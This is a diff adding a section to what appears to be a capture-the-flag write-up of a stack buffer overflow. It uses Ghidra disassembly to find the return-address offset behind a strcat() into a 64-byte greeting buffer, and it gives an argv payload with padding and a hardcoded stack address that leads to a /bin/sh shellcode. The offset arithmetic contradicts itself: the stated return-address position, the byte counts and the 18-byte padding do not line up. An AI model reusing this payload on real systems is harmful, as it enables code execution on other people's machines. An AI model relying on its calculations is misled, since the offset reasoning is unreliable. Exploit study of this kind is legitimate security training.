@@ -169,6 +169,50 @@ Offset  Content                     Source
 8. Shellcode executes → execve("/bin/sh")
 ```
 
+### Finding the Return Address Offset Using Ghidra
+
+**From greetuser() disassembly in Ghidra:**
+
+```
+SUB ESP, 0x50              # Stack frame: 80 bytes  
+LEA EAX, [EBP - 0x40]      # greeting[64] at EBP - 0x40
+```
+
+**Calculate offset to return address:**
+
+```
+greeting[64] buffer: EBP - 0x40 (64 bytes below saved EBP)
+Saved EBP:           EBP + 0x00 (4 bytes)
+Return address:      EBP + 0x04 (4 bytes above saved EBP)
+```
+
+**Understanding the overflow:**
+
+```
+strcat() writes into 64-byte greeting buffer:
+  - "Hyvää päivää ": 13 bytes (greeting)
+  - username:        72 bytes (40 from argv[1] + 32 from argv[2])
+  Total:            85 bytes → 21-byte overflow
+
+Memory layout after strcat():
+  [0-63]:   greeting buffer (64 bytes filled)
+  [64-67]:  Saved EBP (4 bytes overwritten)
+  [68-71]:  Return address (4 bytes overwritten) ← TARGET
+  [72-84]:  Stack overflow (13 bytes beyond)
+```
+
+**Payload structure:**
+
+The exploit uses:
+```bash
+argv[1] = "A"*40                           # 40 bytes, no null terminator
+argv[2] = "B"*18 + "\xe8\xfe\xff\xbf"     # 18 bytes padding + 4 bytes address
+```
+
+This constructs a 72-byte buffer in main() that is passed to greetuser(). When strcat() appends this buffer after the 13-byte Finnish greeting, the return address embedded in argv[2] overwrites the saved return address on the stack.
+
+The exact byte offset of 18 bytes padding in argv[2] is calculated to align the 4-byte address with the return address location after accounting for the greeting string and argv[1] content.
+
 ### Why This Works
 
 | Requirement | Implementation | Result |
